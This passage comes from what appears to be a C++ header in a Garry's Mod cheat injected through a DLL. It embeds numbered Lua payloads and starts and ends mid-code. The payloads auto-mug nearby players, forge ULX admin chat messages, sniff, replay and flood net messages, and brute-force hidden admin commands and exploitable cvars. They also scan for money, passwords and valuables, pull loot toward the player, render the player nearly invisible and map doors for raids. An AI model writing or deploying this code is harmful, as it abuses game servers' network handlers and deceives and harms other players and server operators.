            if IsValid(phys) then
                -- Try to manipulate the prop upward
                pcall(function()
                    phys:SetVelocity(Vector(0, 0, 200))
                    phys:Wake()
                end)
                _fdll_propfly_ent = ent
            end
        elseif IsValid(_fdll_propfly_ent) then
            local phys = _fdll_propfly_ent:GetPhysicsObject()
            if IsValid(phys) then
                pcall(function()
                    phys:SetVelocity(Vector(0, 0, 200))
                end)
            end
        end
    end)
end)
)lua";

	inline const char* LUA_PROP_FLIGHT_STOP = R"lua(
pcall(function()
    hook.Remove("Think", "_fdll_propfly")
    _fdll_propfly_installed = nil
    _fdll_propfly_ent = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 78. ATM/Bank Exploit -- interact with ATM entities
	// -----------------------------------------------------------------------
	inline const char* LUA_ATM_SCAN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()

    -- Find ATM entities
    local keywords = {"atm", "bank", "vault", "safe", "deposit"}
    for _, e in ipairs(ents.GetAll()) do
        if IsValid(e) then
            local class = e:GetClass():lower()
            for _, kw in ipairs(keywords) do
                if class:find(kw) then
                    local dist = myPos:Distance(e:GetPos())
                    if dist < 3000 then
                        local money = 0
                        pcall(function() money = e:GetMoney() or e:GetStoredMoney() or 0 end)
                        r = r .. string.format("%s\t$%d\t%.0fu\n", class, money, dist)
                    end
                    break
                end
            end
        end
    end
    if r == "" then r = "No ATM/bank entities found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 79. Auto-Mug -- auto-send mug command to nearest player in range
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_MUG = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    local nearest = nil
    local nearDist = 200

    for _, ply in ipairs(player.GetAll()) do
        if ply ~= lp and IsValid(ply) and ply:Alive() then
            local dist = lp:GetPos():Distance(ply:GetPos())
            if dist < nearDist then
                nearest = ply
                nearDist = dist
            end
        end
    end

    if nearest then
        -- Try common mug commands
        RunConsoleCommand("darkrp", "mug", nearest:Nick())
        RunConsoleCommand("say", "/mug")

        -- Try net messages
        pcall(function()
            net.Start("DarkRP_Mug")
            net.WriteEntity(nearest)
            net.SendToServer()
        end)

        r = "Mugging: " .. nearest:Nick() .. " (" .. math.floor(nearDist) .. "u)"
    else
        r = "No players in mug range (<200u)"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 80. Weapon Stat Scanner -- dump all weapon stats for comparison
	// -----------------------------------------------------------------------
	inline const char* LUA_WEAPON_STATS = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    for _, wep in ipairs(lp:GetWeapons()) do
        if IsValid(wep) then
            local class = wep:GetClass()
            local primary = wep:GetPrimaryAmmoType()
            local clip = wep:Clip1()
            local maxClip = wep:GetMaxClip1()
            local dmg = 0
            pcall(function()
                if wep.Primary then dmg = wep.Primary.Damage or 0 end
            end)
            local rof = 0
            pcall(function()
                if wep.Primary then rof = wep.Primary.Delay or 0 end
            end)
            r = r .. string.format("%s\tDmg:%d\tRoF:%.2f\tClip:%d/%d\n",
                class, dmg, rof, clip, maxClip)
        end
    end
    if r == "" then r = "No weapons found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 81. Fake Admin Message -- display fake admin notification
	// -----------------------------------------------------------------------
	inline const char* LUA_FAKE_ADMIN_MSG = R"lua(
pcall(function()
    -- Display a fake ULX-style admin message in chat
    chat.AddText(
        Color(151, 0, 2), "[ULX] ",
        Color(77, 155, 255), "Console",
        Color(255, 255, 255), " has enabled noclip for ",
        Color(77, 155, 255), LocalPlayer():Nick()
    )

    -- Also try notification system
    pcall(function()
        notification.AddLegacy("Admin action logged. Please wait...", NOTIFY_GENERIC, 5)
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 82. Map Teleport Logger -- log all info_teleport_destination entities
	// -----------------------------------------------------------------------
	inline const char* LUA_TELEPORT_MAP_SCAN = R"lua(
local r = ""
pcall(function()
    -- Find teleport destinations and spawn points
    local interesting = {
        "info_teleport_destination", "info_player_start",
        "info_player_terrorist", "info_player_counterterrorist",
        "trigger_teleport", "point_teleport"
    }
    for _, class in ipairs(interesting) do
        for _, e in ipairs(ents.FindByClass(class)) do
            if IsValid(e) then
                local pos = e:GetPos()
                r = r .. string.format("%s\t%.0f, %.0f, %.0f\n",
                    class, pos.x, pos.y, pos.z)
            end
        end
    end

    -- Also find custom DarkRP spawn points
    pcall(function()
        if DarkRP and DarkRP.retrieveSpawnPos then
            r = r .. "\n=== DarkRP Spawns ===\n"
            -- Enumerate team spawns
            for _, teamData in pairs(team.GetAllTeams()) do
                local spawns = DarkRP.retrieveSpawnPos(teamData.Name)
                if spawns then
                    for _, pos in ipairs(spawns) do
                        r = r .. teamData.Name .. "\t" .. tostring(pos) .. "\n"
                    end
                end
            end
        end
    end)

    if r == "" then r = "No teleport/spawn entities found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 83. Wire Exploit -- abuse wiremod if installed
	// -----------------------------------------------------------------------
	inline const char* LUA_WIRE_EXPLOIT = R"lua(
local r = ""
pcall(function()
    if not WireLib then r = "Wiremod not installed" return end

    -- Scan for wire entities with interesting outputs
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    local found = 0
    for _, e in ipairs(ents.FindInSphere(lp:GetPos(), 2000)) do
        if IsValid(e) and e.Outputs then
            for name, output in pairs(e.Outputs) do
                if name:lower():find("money") or name:lower():find("code") or
                   name:lower():find("password") or name:lower():find("access") then
                    local val = output.Value or "?"
                    r = r .. string.format("%s [%s] = %s\n",
                        e:GetClass(), name, tostring(val))
                    found = found + 1
                end
            end
        end
    end
    if found == 0 then r = "No interesting wire outputs found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 84. Container Loot Scanner -- scan for lootable containers nearby
	// -----------------------------------------------------------------------
	inline const char* LUA_CONTAINER_SCAN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()

    local keywords = {"chest", "loot", "crate", "container", "stash",
                      "storage", "box", "locker", "cabinet", "shelf"}
    local found = 0

    for _, e in ipairs(ents.GetAll()) do
        if IsValid(e) then
            local class = e:GetClass():lower()
            local model = (e:GetModel() or ""):lower()
            for _, kw in ipairs(keywords) do
                if class:find(kw) or model:find(kw) then
                    local dist = myPos:Distance(e:GetPos())
                    if dist < 2000 then
                        local owner = "?"
                        pcall(function()
                            if e.Getowning_ent and IsValid(e:Getowning_ent()) then
                                owner = e:Getowning_ent():Nick()
                            end
                        end)
                        r = r .. string.format("%s\t%.0fu\t%s\n", class, dist, owner)
                        found = found + 1
                    end
                    break
                end
            end
        end
    end
    if found == 0 then r = "No lootable containers found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 85. Custom Death Sound -- play custom sound on kills
	// -----------------------------------------------------------------------
	inline const char* LUA_KILL_SOUND_SETUP = R"lua(
pcall(function()
    if _fdll_killsound_installed then return end
    _fdll_killsound_installed = true

    hook.Add("EntityTakeDamage", "_fdll_killsound", function(target, dmg)
        if dmg:GetAttacker() == LocalPlayer() and target:IsPlayer() then
            if target:Health() <= dmg:GetDamage() then
                surface.PlaySound("garrysmod/balloon_pop_cute.wav")
                -- Also try HL2 sounds
                pcall(function()
                    LocalPlayer():EmitSound("vo/npc/male01/hacks01.wav", 50, 100, 0.5)
                end)
            end
        end
    end)
end)
)lua";

	inline const char* LUA_KILL_SOUND_STOP = R"lua(
pcall(function()
    hook.Remove("EntityTakeDamage", "_fdll_killsound")
    _fdll_killsound_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 86. Spectator Cam Hijack -- when dead, force spectate specific player
	// -----------------------------------------------------------------------
	inline const char* LUA_SPEC_TARGET = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    -- Find richest player to spectate
    local richest = nil
    local maxMoney = 0
    for _, ply in ipairs(player.GetAll()) do
        if ply ~= lp and IsValid(ply) and ply:Alive() then
            local money = 0
            pcall(function() money = ply:getDarkRPVar("money") or 0 end)
            if money > maxMoney then
                maxMoney = money
                richest = ply
            end
        end
    end

    if richest then
        RunConsoleCommand("spec_player", richest:Nick())
        RunConsoleCommand("spec_mode", "4") -- first person
        r = "Spectating: " .. richest:Nick() .. " ($" .. maxMoney .. ")"
    else
        r = "No targets to spectate"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 88. Net Payload Sniffer Setup -- captures net.Write* arguments
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_PAYLOAD_SETUP = R"lua(
pcall(function()
    if _fdll_payload_sniff_active then return end
    _fdll_payload_sniff_active = true
    _fdll_net_incoming_p = _fdll_net_incoming_p or {}
    _fdll_net_outgoing_p = _fdll_net_outgoing_p or {}
    _fdll_current_out_payload = nil

    -- Wrap incoming handlers to capture read data
    if net.Receivers then
        for name, fn in pairs(net.Receivers) do
            local origFn = fn
            local capName = name
            net.Receivers[name] = function(len, ply)
                local payload = {}
                local ok = pcall(function()
                    local bitsLeft = net.BytesLeft() * 8
                    if bitsLeft > 0 and bitsLeft < 4096 then
                        local s = pcall(function()
                            local str = net.ReadString()
                            if str and #str > 0 and #str < 200 then
                                table.insert(payload, "S:" .. str:sub(1,60))
                            end
                        end)
                    end
                end)
                table.insert(_fdll_net_incoming_p, {
                    n = capName, l = len, t = CurTime(), dir = "IN",
                    p = table.concat(payload, "|")
                })
                if #_fdll_net_incoming_p > 200 then table.remove(_fdll_net_incoming_p, 1) end
                origFn(len, ply)
            end
        end
    end

    -- Hook future registrations with payload capture
    local origRecv = net.Receive
    net.Receive = function(name, func)
        origRecv(name, function(len, ply)
            table.insert(_fdll_net_incoming_p, {
                n = name, l = len, t = CurTime(), dir = "IN", p = ""
            })
            if #_fdll_net_incoming_p > 200 then table.remove(_fdll_net_incoming_p, 1) end
            func(len, ply)
        end)
    end

    -- Hook outgoing with payload capture
    local origStart = _fdll_origNetStart or net.Start
    _fdll_origNetStart = origStart
    net.Start = function(name, ...)
        _fdll_current_out_payload = {parts = {}}
        local result = origStart(name, ...)
        table.insert(_fdll_net_outgoing_p, {
            n = name, t = CurTime(), dir = "OUT", l = 0, p = ""
        })
        if #_fdll_net_outgoing_p > 200 then table.remove(_fdll_net_outgoing_p, 1) end
        return result
    end

    -- Wrap write functions to capture arguments
    local writeFuncs = {
        {"WriteString", "S"}, {"WriteUInt", "U"}, {"WriteInt", "I"},
        {"WriteFloat", "F"}, {"WriteBool", "B"}, {"WriteEntity", "E"}
    }
    for _, wf in ipairs(writeFuncs) do
        local fname = wf[1]
        local prefix = wf[2]
        local origFn = net[fname]
        if origFn then
            local savedName = "_fdll_orig_net_" .. fname
            _G[savedName] = _G[savedName] or origFn
            net[fname] = function(...)
                if _fdll_current_out_payload then
                    local args = {...}
                    local val = tostring(args[1] or "nil"):sub(1, 40)
                    table.insert(_fdll_current_out_payload.parts, prefix .. ":" .. val)
                end
                return _G[savedName](...)
            end
        end
    end

    -- Capture payload on send
    local origSend = _fdll_origNetSendToServer or net.SendToServer
    _fdll_origNetSendToServer = origSend
    net.SendToServer = function(...)
        if _fdll_current_out_payload and #_fdll_net_outgoing_p > 0 then
            _fdll_net_outgoing_p[#_fdll_net_outgoing_p].p = table.concat(_fdll_current_out_payload.parts, "|")
            _fdll_current_out_payload = nil
        end
        return origSend(...)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 89. Net Payload Read -- returns messages with payload data
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_PAYLOAD_READ = R"lua(
local r = ""
pcall(function()
    if _fdll_net_incoming_p then
        for i = math.max(1, #_fdll_net_incoming_p - 30), #_fdll_net_incoming_p do
            local e = _fdll_net_incoming_p[i]
            if e then
                local payload = e.p or ""
                r = r .. string.format("IN\t%.1f\t%s\t%d\t%s\n",
                    e.t or 0, e.n or "?", e.l or 0, payload)
            end
        end
    end
    if _fdll_net_outgoing_p then
        for i = math.max(1, #_fdll_net_outgoing_p - 15), #_fdll_net_outgoing_p do
            local e = _fdll_net_outgoing_p[i]
            if e then
                local payload = e.p or ""
                r = r .. string.format("OUT\t%.1f\t%s\t0\t%s\n",
                    e.t or 0, e.n or "?", payload)
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 90. Modified Replay -- replay last captured packet with modifications
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_MODIFIED_REPLAY = R"lua(
local r = ""
pcall(function()
    if not _fdll_replay_buffer or #_fdll_replay_buffer == 0 then
        r = "No captured messages to replay.\n"
        return
    end

    -- List all captured messages for selection
    r = "CAPTURED PACKETS:\n"
    for i, msg in ipairs(_fdll_replay_buffer) do
        local writeInfo = ""
        for _, w in ipairs(msg.writes or {}) do
            writeInfo = writeInfo .. w.func .. "(" .. tostring(w.args[1] or ""):sub(1,20) .. ") "
        end
        r = r .. i .. "\t" .. msg.name .. "\t" .. #(msg.writes or {}) .. " writes\t" .. writeInfo .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 91. Net Message Flood -- rapid-fire a captured message (rate limited)
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_FLOOD_LAST = R"lua(
local r = ""
pcall(function()
    if not _fdll_replay_buffer or #_fdll_replay_buffer == 0 then
        r = "No captured messages.\n"
        return
    end
    local msg = _fdll_replay_buffer[#_fdll_replay_buffer]
    if not msg or not msg.name then
        r = "Invalid replay entry.\n"
        return
    end

    local origStart = _fdll_origNetStart or net.Start
    local origSend = _fdll_origNetSendToServer or net.SendToServer
    local count = 0
    local maxSend = 5

    for attempt = 1, maxSend do
        local ok = pcall(function()
            origStart(msg.name)
            for _, w in ipairs(msg.writes or {}) do
                local origFn = _G["_fdll_orig_net_" .. w.func] or net[w.func]
                if origFn and w.args then
                    origFn(unpack(w.args))
                end
            end
            origSend()
        end)
        if ok then count = count + 1 end
    end
    r = "FLOODED\t" .. msg.name .. "\t" .. count .. "/" .. maxSend .. " sent\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 92. Net Channel Info -- dump engine net channel statistics
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_CHANNEL_INFO = R"lua(
local r = ""
pcall(function()
    local nc = LocalPlayer():GetNWString("_nc_debug", "")
    -- Use engine functions
    local ip = game.GetIPAddress and game.GetIPAddress() or "unknown"
    local tick = engine.TickInterval and engine.TickInterval() or 0
    local tickCount = engine.TickCount and engine.TickCount() or 0
    local maxPlayers = game.MaxPlayers and game.MaxPlayers() or 0
    local curPlayers = #player.GetAll()
    local map = game.GetMap and game.GetMap() or "unknown"
    local hostname = GetHostName and GetHostName() or "unknown"

    r = r .. "Server: " .. hostname .. "\n"
    r = r .. "Map: " .. map .. "\n"
    r = r .. "IP: " .. ip .. "\n"
    r = r .. "Tick Interval: " .. tick .. "s (" .. math.floor(1/math.max(tick,0.001)) .. " tick)\n"
    r = r .. "Tick Count: " .. tickCount .. "\n"
    r = r .. "Players: " .. curPlayers .. "/" .. maxPlayers .. "\n"

    -- Net string table dump
    local netStrings = {}
    for i = 0, 4095 do
        local name = util.NetworkIDToString(i)
        if name and name ~= "" then
            table.insert(netStrings, {id = i, name = name})
        end
    end
    r = r .. "Net Strings: " .. #netStrings .. "\n"

    -- Latency info
    local lp = LocalPlayer()
    if IsValid(lp) then
        local ping = lp:Ping()
        r = r .. "Ping: " .. ping .. "ms\n"
        local loss = 0
        pcall(function()
            if lp.GetPacketLoss then loss = lp:GetPacketLoss() end
        end)
        r = r .. "Packet Loss: " .. string.format("%.1f%%", loss * 100) .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 93. Net Rate Limiter Bypass -- test server's rate limiting
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_RATELIMIT_TEST = R"lua(
local r = ""
pcall(function()
    -- Find the most common net messages and test rate limits
    local testMsgs = {}
    if _fdll_net_incoming then
        local freq = {}
        for _, e in ipairs(_fdll_net_incoming) do
            freq[e.n] = (freq[e.n] or 0) + 1
        end
        for name, count in pairs(freq) do
            if count > 3 then
                table.insert(testMsgs, {name = name, count = count})
            end
        end
        table.sort(testMsgs, function(a, b) return a.count > b.count end)
    end

    r = "RATE LIMIT ANALYSIS:\n"
    for i = 1, math.min(10, #testMsgs) do
        local m = testMsgs[i]
        r = r .. string.format("%s: %d msgs (%.1f/sec est)\n", m.name, m.count, m.count / 30)
    end

    if #testMsgs == 0 then
        r = r .. "No messages captured yet. Enable Deep Net Hook first.\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 94. Net String Table Exhaustive Dump
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_STRING_DUMP = R"lua(
local r = ""
pcall(function()
    local found = {}
    for i = 0, 4095 do
        local name = util.NetworkIDToString(i)
        if name and name ~= "" then
            table.insert(found, string.format("%d\t%s", i, name))
        end
    end
    r = table.concat(found, "\n")
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 95. Network Variable Spy -- dump all NW/NW2 variables on players
	// -----------------------------------------------------------------------
	inline const char* LUA_NW_VARIABLE_SPY = R"lua(
local r = ""
pcall(function()
    for _, ply in ipairs(player.GetAll()) do
        if not IsValid(ply) then continue end
        local nick = ply:Nick()
        local nwVars = {}

        -- NW vars
        if ply.GetNWVarTable then
            local ok, tbl = pcall(ply.GetNWVarTable, ply)
            if ok and tbl then
                for k, v in pairs(tbl) do
                    table.insert(nwVars, tostring(k) .. "=" .. tostring(v))
                end
            end
        end

        -- DarkRP vars
        if ply.getDarkRPVar then
            local keys = {"money","job","salary","wanted","HasGunlicense","rpname","energy"}
            for _, k in ipairs(keys) do
                local ok, val = pcall(ply.getDarkRPVar, ply, k)
                if ok and val ~= nil then
                    table.insert(nwVars, "drp." .. k .. "=" .. tostring(val))
                end
            end
        end

        if #nwVars > 0 then
            r = r .. nick .. "\t" .. table.concat(nwVars, "|") .. "\n"
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 96. Concommand Intercept -- hook RunConsoleCommand to spy on outgoing
	// -----------------------------------------------------------------------
	inline const char* LUA_CONCOMMAND_INTERCEPT_SETUP = R"lua(
pcall(function()
    if _fdll_cmd_intercept_active then return end
    _fdll_cmd_intercept_active = true
    _fdll_cmd_log = _fdll_cmd_log or {}

    local origRCC = RunConsoleCommand
    RunConsoleCommand = function(cmd, ...)
        local args = {...}
        table.insert(_fdll_cmd_log, {
            t = CurTime(),
            cmd = cmd,
            args = table.concat(args, " ")
        })
        if #_fdll_cmd_log > 100 then table.remove(_fdll_cmd_log, 1) end
        return origRCC(cmd, ...)
    end
end)
)lua";

	inline const char* LUA_CONCOMMAND_INTERCEPT_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_cmd_log then return end
    for i = math.max(1, #_fdll_cmd_log - 24), #_fdll_cmd_log do
        local e = _fdll_cmd_log[i]
        if e then
            r = r .. string.format("%.1f\t%s\t%s\n", e.t, e.cmd, e.args or "")
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 97. HTTP Request Spy -- intercept HTTP/fetch calls
	// -----------------------------------------------------------------------
	inline const char* LUA_HTTP_SPY_SETUP = R"lua(
pcall(function()
    if _fdll_http_spy_active then return end
    _fdll_http_spy_active = true
    _fdll_http_log = _fdll_http_log or {}

    if http and http.Fetch then
        local origFetch = http.Fetch
        http.Fetch = function(url, ...)
            table.insert(_fdll_http_log, {
                t = CurTime(), method = "FETCH", url = url:sub(1, 120)
            })
            if #_fdll_http_log > 50 then table.remove(_fdll_http_log, 1) end
            return origFetch(url, ...)
        end
    end

    if http and http.Post then
        local origPost = http.Post
        http.Post = function(url, params, ...)
            local paramStr = ""
            if type(params) == "table" then
                for k, v in pairs(params) do
                    paramStr = paramStr .. tostring(k) .. "=" .. tostring(v):sub(1,30) .. "&"
                end
            end
            table.insert(_fdll_http_log, {
                t = CurTime(), method = "POST", url = url:sub(1, 120), params = paramStr:sub(1, 200)
            })
            if #_fdll_http_log > 50 then table.remove(_fdll_http_log, 1) end
            return origPost(url, params, ...)
        end
    end

    if HTTP then
        local origHTTP = HTTP
        HTTP = function(req, ...)
            if type(req) == "table" then
                table.insert(_fdll_http_log, {
                    t = CurTime(),
                    method = req.method or "GET",
                    url = (req.url or ""):sub(1, 120)
                })
                if #_fdll_http_log > 50 then table.remove(_fdll_http_log, 1) end
            end
            return origHTTP(req, ...)
        end
    end
end)
)lua";

	inline const char* LUA_HTTP_SPY_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_http_log then return end
    for _, e in ipairs(_fdll_http_log) do
        r = r .. string.format("%.1f\t%s\t%s", e.t, e.method, e.url)
        if e.params and e.params ~= "" then r = r .. "\t" .. e.params end
        r = r .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 99. Entity Magnet -- pull nearby valuable entities toward you
	// -----------------------------------------------------------------------
	inline const char* LUA_ENTITY_MAGNET_SETUP = R"lua(
pcall(function()
    if _fdll_magnet_active then return end
    _fdll_magnet_active = true
    _fdll_magnet_range = 600
    _fdll_magnet_force = 2000

    hook.Add("Think", "_fdll_magnet", function()
        if not _fdll_magnet_active then return end
        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end
        local myPos = lp:GetPos() + Vector(0, 0, 40)

        for _, e in ipairs(ents.FindInSphere(myPos, _fdll_magnet_range)) do
            if not IsValid(e) then continue end
            local cls = string.lower(e:GetClass() or "")
            local isValuable = string.find(cls, "printer") or string.find(cls, "shipment")
                or string.find(cls, "money") or string.find(cls, "drug")
                or string.find(cls, "meth") or string.find(cls, "weed")
                or string.find(cls, "bitcoin") or string.find(cls, "miner")
                or string.find(cls, "weapon_") or string.find(cls, "item_")

            if isValuable then
                local phys = e:GetPhysicsObject()
                if IsValid(phys) then
                    local dir = (myPos - e:GetPos()):GetNormalized()
                    phys:ApplyForceCenter(dir * _fdll_magnet_force)
                    phys:Wake()
                end
            end
        end
    end)
end)
)lua";

	inline const char* LUA_ENTITY_MAGNET_STOP = R"lua(
pcall(function()
    _fdll_magnet_active = false
    hook.Remove("Think", "_fdll_magnet")
end)
)lua";

	// -----------------------------------------------------------------------
	// 100. Ghost Mode -- make yourself nearly invisible via render hooks
	// -----------------------------------------------------------------------
	inline const char* LUA_GHOST_MODE_SETUP = R"lua(
pcall(function()
    if _fdll_ghost_active then return end
    _fdll_ghost_active = true
    _fdll_ghost_alpha = 5

    hook.Add("PrePlayerDraw", "_fdll_ghost", function(ply)
        if ply == LocalPlayer() then
            render.SetBlend(_fdll_ghost_alpha / 255)
            ply:SetColor(Color(255, 255, 255, _fdll_ghost_alpha))
            ply:SetRenderMode(RENDERMODE_TRANSALPHA)
        end
    end)

    hook.Add("PostPlayerDraw", "_fdll_ghost_post", function(ply)
        if ply == LocalPlayer() then
            render.SetBlend(1)
        end
    end)

    -- Suppress footstep sounds
    hook.Add("PlayerFootstep", "_fdll_ghost_foot", function(ply, pos, foot, sound, volume)
        if ply == LocalPlayer() then return true end
    end)

    -- Remove shadows
    local lp = LocalPlayer()
    if IsValid(lp) then
        lp:SetNoTarget(true)
        lp:DrawShadow(false)
    end
end)
)lua";

	inline const char* LUA_GHOST_MODE_STOP = R"lua(
pcall(function()
    _fdll_ghost_active = false
    hook.Remove("PrePlayerDraw", "_fdll_ghost")
    hook.Remove("PostPlayerDraw", "_fdll_ghost_post")
    hook.Remove("PlayerFootstep", "_fdll_ghost_foot")
    local lp = LocalPlayer()
    if IsValid(lp) then
        lp:SetColor(Color(255, 255, 255, 255))
        lp:SetRenderMode(RENDERMODE_NORMAL)
        lp:DrawShadow(true)
        lp:SetNoTarget(false)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 101. Anti-Crash Shield -- detect crash entities and spam
	// -----------------------------------------------------------------------
	inline const char* LUA_ANTICRASH_SETUP = R"lua(
pcall(function()
    if _fdll_anticrash_active then return end
    _fdll_anticrash_active = true
    _fdll_crash_log = _fdll_crash_log or {}
    _fdll_ent_spawn_tracker = {}
    _fdll_last_crash_check = 0

    hook.Add("Think", "_fdll_anticrash", function()
        local now = CurTime()
        if now - _fdll_last_crash_check < 0.5 then return end
        _fdll_last_crash_check = now

        -- Track entity spawn rates per player
        local spawnRates = {}
        for _, e in ipairs(ents.GetAll()) do
            if not IsValid(e) then continue end
            local cls = e:GetClass() or ""
            local owner = nil
            pcall(function()
                if e.CPPIGetOwner then owner = e:CPPIGetOwner() end
            end)
            if IsValid(owner) and owner:IsPlayer() then
                local sid = owner:SteamID()
                spawnRates[sid] = (spawnRates[sid] or 0) + 1
            end

            -- Detect known crasher entities
            local isCrash = false
            if string.find(cls, "ragdoll") then
                local phys = e:GetPhysicsObjectCount()
                if phys and phys > 50 then isCrash = true end
            end
            if string.find(cls, "wire_expression") or string.find(cls, "wire_e2") then
                pcall(function()
                    if e:GetOverlayText() and #e:GetOverlayText() > 10000 then
                        isCrash = true
                    end
                end)
            end
            if isCrash then
                e:SetNoDraw(true)
                e:SetRenderMode(RENDERMODE_NONE)
                table.insert(_fdll_crash_log, {
                    t = now, cls = cls,
                    owner = IsValid(owner) and owner:Nick() or "unknown"
                })
            end
        end

        -- Flag players spawning too many entities
        for sid, count in pairs(spawnRates) do
            if count > 150 then
                table.insert(_fdll_crash_log, {
                    t = now, cls = "ENTITY_SPAM",
                    owner = sid .. " (" .. count .. " ents)"
                })
            end
        end

        if #_fdll_crash_log > 50 then
            for i = 1, #_fdll_crash_log - 50 do
                table.remove(_fdll_crash_log, 1)
            end
        end
    end)

    -- Block known crash models from rendering
    hook.Add("PreDrawOpaqueRenderables", "_fdll_anticrash_render", function()
        for _, e in ipairs(ents.GetAll()) do
            if not IsValid(e) then continue end
            local mdl = e:GetModel() or ""
            if #mdl > 200 or string.find(mdl, "error") then
                e:SetNoDraw(true)
            end
        end
    end)
end)
)lua";

	inline const char* LUA_ANTICRASH_STOP = R"lua(
pcall(function()
    _fdll_anticrash_active = false
    hook.Remove("Think", "_fdll_anticrash")
    hook.Remove("PreDrawOpaqueRenderables", "_fdll_anticrash_render")
end)
)lua";

	inline const char* LUA_ANTICRASH_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_crash_log then return end
    for _, e in ipairs(_fdll_crash_log) do
        r = r .. string.format("%.1f\t%s\t%s\n", e.t, e.cls, e.owner)
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 102. Server ConCommand Fuzzer -- discover hidden admin commands
	// -----------------------------------------------------------------------
	inline const char* LUA_CONCOMMAND_FUZZER = R"lua(
local r = ""
pcall(function()
    local found = {}
    local tbl = concommand.GetTable()
    if not tbl then return end

    -- Categorize commands
    local categories = {
        admin = {}, darkrp = {}, ulx = {}, sam = {},
        wire = {}, custom = {}, hidden = {}
    }

    for name, data in pairs(tbl) do
        local low = string.lower(name)
        if string.find(low, "ulx") or string.find(low, "ulib") then
            table.insert(categories.admin, name)
        elseif string.find(low, "darkrp") or string.find(low, "rp_") then
            table.insert(categories.darkrp, name)
        elseif string.find(low, "sam") then
            table.insert(categories.sam, name)
        elseif string.find(low, "wire") or string.find(low, "e2") then
            table.insert(categories.wire, name)
        else
            table.insert(categories.custom, name)
        end
    end

    -- Brute-force common admin command patterns
    local prefixes = {"ulx_", "sam_", "!admin_", "fadmin_", "xadmin_", "serverguard_",
                      "_darkrp", "darkrp_", "rp_", "admin_", "sv_", "debug_"}
    local actions = {"ban", "kick", "tp", "teleport", "give", "money", "setmoney",
                     "addmoney", "god", "noclip", "slay", "slap", "jail", "unjail",
                     "mute", "unmute", "gag", "freeze", "unfreeze", "cloak", "strip",
                     "armour", "setjob", "setteam", "setmodel", "setname", "rcon",
                     "changelevel", "exec", "lua_run", "cexec", "plycexec"}

    local bruteFound = {}
    for _, pre in ipairs(prefixes) do
        for _, act in ipairs(actions) do
            local cmd = pre .. act
            if tbl[cmd] then
                table.insert(bruteFound, cmd)
            end
        end
    end

    r = "=== SERVER COMMANDS ===\n"
    for cat, cmds in pairs(categories) do
        if #cmds > 0 then
            table.sort(cmds)
            r = r .. "\n[" .. string.upper(cat) .. "] (" .. #cmds .. "):\n"
            for _, c in ipairs(cmds) do
                r = r .. "  " .. c .. "\n"
            end
        end
    end

    if #bruteFound > 0 then
        r = r .. "\n[BRUTE-FORCE DISCOVERED] (" .. #bruteFound .. "):\n"
        for _, c in ipairs(bruteFound) do
            r = r .. "  ** " .. c .. " **\n"
        end
    end

    r = r .. "\nTotal commands: " .. table.Count(tbl)

    -- Also scan CVars
    local dangerousCvars = {"sv_allowcslua", "sv_cheats", "host_timescale",
        "sv_friction", "sv_gravity", "sv_airaccelerate", "sv_maxvelocity",
        "net_fakelag", "net_fakeloss", "cl_interp", "cl_interp_ratio",
        "mp_friendlyfire", "sbox_noclip", "sbox_godmode", "sbox_maxprops"}

    r = r .. "\n\n=== EXPLOITABLE CVARS ===\n"
    for _, cv in ipairs(dangerousCvars) do
        local obj = GetConVar(cv)
        if obj then
            r = r .. cv .. " = " .. obj:GetString() .. "\n"
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 103. Auto-Raid Intelligence -- complete base layout mapper
	// -----------------------------------------------------------------------
	inline const char* LUA_RAID_INTEL = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()

    -- Map all doors and their owners within range
    local bases = {}
    local doorData = {}
    for _, e in ipairs(ents.FindInSphere(myPos, 2000)) do
        if not IsValid(e) then continue end
        local cls = e:GetClass() or ""
        if not (string.find(cls, "door") or string.find(cls, "prop_door")) then continue end

        local owner = "unowned"
        pcall(function()
            if e.getDoorOwner and IsValid(e:getDoorOwner()) then
